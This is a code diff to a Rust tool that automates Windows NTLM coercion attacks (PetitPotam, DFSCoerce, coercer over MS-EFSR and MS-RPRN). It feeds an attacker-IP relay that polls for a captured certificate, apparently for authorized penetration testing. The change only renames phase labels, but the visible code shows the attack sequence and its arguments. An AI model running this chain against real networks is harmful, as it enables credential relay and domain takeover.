@@ -810,10 +810,9 @@ async fn run_relay_and_coerce<P: CoerceProcs>(
     let mut summary = format!("RELAY_PID={}\n", relay.pid());
     let mut captured_via: Option<&'static str> = None;
 
-    // --- Phase 1: unauthenticated PetitPotam ---
     // Distros differ: Kali ships `petitpotam` (symlink), pip ships
     // `impacket-petitpotam`. Try in order, log if both missing.
-    summary.push_str("=== Phase 1: unauth PetitPotam ===\n");
+    summary.push_str("=== unauth PetitPotam ===\n");
     let petit_bin = ["petitpotam", "impacket-petitpotam"]
         .into_iter()
         .find(|b| procs.which_binary(b))
@@ -826,7 +825,7 @@ async fn run_relay_and_coerce<P: CoerceProcs>(
     procs
         .run_phase(
             &coerce_log,
-            "Phase 1: unauth PetitPotam",
+            "unauth PetitPotam",
             petit_bin,
             &p1_args,
             &workdir,
@@ -837,9 +836,8 @@ async fn run_relay_and_coerce<P: CoerceProcs>(
         captured_via = Some("unauth_petitpotam");
     }
 
-    // --- Phase 2: authenticated DFSCoerce ---
     if captured_via.is_none() && cfg.coerce_user.is_some() {
-        summary.push_str("=== Phase 2: authenticated DFSCoerce (MS-DFSNM) ===\n");
+        summary.push_str("=== authenticated DFSCoerce (MS-DFSNM) ===\n");
         let user = cfg.coerce_user.as_deref().unwrap();
         let secret_args = coerce_secret_args(cfg.coerce_secret.as_ref());
         let mut a: Vec<&str> = vec!["-u", user, "-d", cfg.coerce_domain.as_str()];
@@ -849,28 +847,18 @@ async fn run_relay_and_coerce<P: CoerceProcs>(
         a.push(cfg.attacker_ip.as_str());
         a.push(cfg.coerce_target.as_str());
         procs
-            .run_phase(
-                &coerce_log,
-                "Phase 2: DFSCoerce",
-                "dfscoerce",
-                &a,
-                &workdir,
-                25,
-            )
+            .run_phase(&coerce_log, "DFSCoerce", "dfscoerce", &a, &workdir, 25)
             .await;
         if poll_for_cert(&relay_log, opts.poll_phase_2, opts.poll_interval).await {
             captured_via = Some("MS-DFSNM");
         }
     }
 
-    // --- Phase 3: coercer over MS-EFSR / MS-RPRN ---
     if captured_via.is_none() && cfg.coerce_user.is_some() {
         let user = cfg.coerce_user.as_deref().unwrap();
         let secret_args = coerce_secret_args(cfg.coerce_secret.as_ref());
         for proto in ["MS-EFSR", "MS-RPRN"] {
-            summary.push_str(&format!(
-                "=== Phase 3: authenticated coerce via {proto} ===\n"
-            ));
+            summary.push_str(&format!("=== authenticated coerce via {proto} ===\n"));
             let mut a: Vec<&str> = vec![
                 "coerce",
                 "-u",
@@ -893,7 +881,7 @@ async fn run_relay_and_coerce<P: CoerceProcs>(
             procs
                 .run_phase(
                     &coerce_log,
-                    &format!("Phase 3: {proto}"),
+                    &format!("coerce via {proto}"),
                     "coercer",
                     &a,
                     &workdir,
@@ -1721,10 +1709,10 @@ mod tests {
         }
     }
 
-    const PHASE1: &str = "Phase 1: unauth PetitPotam";
-    const PHASE2: &str = "Phase 2: DFSCoerce";
-    const PHASE3_EFSR: &str = "Phase 3: MS-EFSR";
-    const PHASE3_RPRN: &str = "Phase 3: MS-RPRN";
+    const PHASE1: &str = "unauth PetitPotam";
+    const PHASE2: &str = "DFSCoerce";
+    const PHASE3_EFSR: &str = "coerce via MS-EFSR";
+    const PHASE3_RPRN: &str = "coerce via MS-RPRN";
 
     #[tokio::test]
     async fn run_attacker_ip_not_local_bails_with_clear_error() {
